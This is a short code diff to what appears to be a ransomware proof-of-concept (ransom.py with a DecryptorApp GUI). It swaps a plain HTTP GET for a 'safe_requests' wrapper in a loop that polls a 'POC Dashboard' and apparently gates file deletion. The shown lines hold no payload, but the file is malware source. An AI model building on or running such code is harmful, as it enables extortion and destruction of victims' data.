@@ -21,10 +21,11 @@ from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
-from requests import post, exceptions, get
+from requests import post, exceptions
 from time import sleep
 from PIL import Image, ImageTk
 from threading import Event, Thread
+from security import safe_requests
 
 """ Part 1: Application functions """
 # Defining Function to load the current path of ransom.py and then join it to relative_path
@@ -630,7 +631,7 @@ class DecryptorApp(Tk):
         while not self.stopDeletion:
             try:
                 # Send GET request to POC Dashboard and return response as JSON
-                response = get(url, timeout=10)
+                response = safe_requests.get(url, timeout=10)
                 response.raise_for_status()
                 data = response.json()
 
